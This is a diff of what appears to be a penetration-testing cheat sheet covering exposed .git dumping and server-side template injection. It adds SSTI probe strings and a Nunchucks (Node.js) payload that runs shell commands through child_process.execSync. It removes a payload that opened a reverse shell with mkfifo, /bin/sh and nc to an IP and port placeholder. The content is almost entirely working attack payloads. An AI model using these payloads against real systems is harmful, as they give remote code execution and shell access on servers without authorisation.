@@ -282,10 +282,19 @@ githacker --url http://url/.git/ --folder result
 # SSTI
 [Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
 
+### Test
+```
+{{1+1}}
+${1+1}
+<%= 1+1 %>
+${{1+1}}
+#{1+1}
+```
+
 ### Nunchucks (Nodejs)
 ```
-{{range.constructor("console.log(123)")()}} => 123
-{{range.constructor("return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f')")()}}
+{{range.constructor("console.log(123)")()}}
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
 ```
 
 ### Python (Jinja2)
